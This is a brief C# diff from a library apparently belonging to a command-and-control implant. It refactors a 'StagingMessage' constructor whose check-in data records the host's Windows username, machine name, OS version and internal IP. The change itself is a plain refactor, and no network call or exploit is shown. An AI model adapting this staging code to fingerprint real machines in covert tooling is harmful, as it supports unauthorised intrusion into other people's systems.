@@ -16,10 +16,10 @@ namespace MarauderLib.Objects {
     public string InternalIP;
 
     public StagingMessage() {
-      if (String.IsNullOrEmpty(Marauder.StagingId)) {
-        Marauder.StagingId = CryptoService.GenerateSecureString(8);
+      if (String.IsNullOrEmpty(State.StagingId)) {
+        State.StagingId = CryptoService.GenerateSecureString(8);
       }
-      this.StagingId = Marauder.StagingId;
+      this.StagingId = State.StagingId;
       this.Username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
       this.Hostname = Environment.MachineName;
       this.OperatingSystem = Environment.OSVersion.ToString();
